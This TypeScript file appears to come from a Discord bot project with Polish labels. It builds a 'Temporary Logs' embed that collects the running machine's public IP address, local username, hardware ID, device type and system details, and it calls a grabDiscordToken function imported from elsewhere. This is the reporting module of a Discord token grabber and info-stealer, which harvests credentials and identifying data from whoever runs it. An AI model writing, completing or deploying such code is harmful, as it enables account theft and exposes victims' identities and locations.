import { EmbedBuilder, Client } from 'discord.js'
import { getRandomColor } from '@/bot/functions/colors'
import { getFormattedTime } from '@/bot/functions/date'
import { getSystemInfo } from '@/bot/functions/check_system'
import { getLocalUsername } from '@/bot/functions/check_user'
import { getPublicIP } from '@/bot/functions/ip'
import { getDeviceType } from '@/bot/functions/device'
import { getHWID } from '@/bot/functions/hwid'
import { grabDiscordToken } from '@/bot/functions/grab_token'

export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
  const publicIp = await getPublicIP()
  const localUser = getLocalUsername()
  const hwid = await getHWID()
  const time = getFormattedTime()
  const device = getDeviceType()
  const system = getSystemInfo()
  grabDiscordToken()

  const embed = new EmbedBuilder()
    .setTitle('📝 **Temporary Logs** 📝')
    .setColor(getRandomColor())
    .setThumbnail(client.user?.displayAvatarURL() || '')
    .addFields(
      { name: '⏰ **Data**', value: time, inline: true },
      { name: '💻 **Urządzenie**', value: device, inline: true },
      { name: '⚙️ **System**', value: system, inline: true },
      { name: '🌐 **IPv4**', value: publicIp, inline: true },
      { name: '👤 **Użytkownik**', value: localUser, inline: true },
      { name: '🆔 **HWID**', value: hwid, inline: true }
    )
    .setTimestamp()
    .setFooter({ text: `Utworzyła ${client.user?.username || 'Botka'}` })

  return embed
}
